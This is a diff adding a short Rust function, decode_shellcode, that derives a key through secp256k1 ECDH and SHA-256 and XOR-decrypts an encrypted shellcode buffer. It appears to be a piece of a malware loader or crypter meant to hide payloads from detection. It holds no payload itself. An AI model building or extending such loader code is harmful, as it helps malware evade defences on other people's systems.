@@ -1,0 +1,43 @@
+use k256::{elliptic_curve::sec1::FromEncodedPoint, EncodedPoint, ProjectivePoint, Scalar};
+use k256::elliptic_curve::group::GroupEncoding;
+use sha2::Digest;
+
+
+/* 
+
+    let r_point_bytes = r_point.as_bytes();
+    
+    // let encode_r_point = EncodedPoint::<Secp256k1>::from_bytes(r_point_bytes)
+    // .expect("Invalid EncodedPoint");
+*/
+
+
+pub fn decode_shellcode(
+    encrypted_shellcode: &[u8],
+    // r: &EncodedPoint,
+    r_point_bytes: &[u8],
+    private_key: &Scalar,
+) -> Vec<u8> {
+
+    // rebuild the r_point from bytes !
+
+    let r = EncodedPoint::from_bytes(r_point_bytes)
+        .expect("Invalid EncodedPoint");
+
+    // compute the shared secret key
+    let r_point = ProjectivePoint::from_encoded_point(&r).expect("Invalid R point");
+    let shared_secret = r_point * private_key;
+    let shared_secret_bytes = shared_secret.to_bytes();
+
+    // derive the decryption key from shared secret
+    let mut hasher = sha2::Sha256::new();
+    hasher.update(shared_secret_bytes);
+    let decryption_key = hasher.finalize();
+
+    // decrypt shellcode
+    encrypted_shellcode
+        .iter()
+        .zip(decryption_key.iter().cycle())
+        .map(|(&byte, &key)| byte ^ key)
+        .collect()
+}
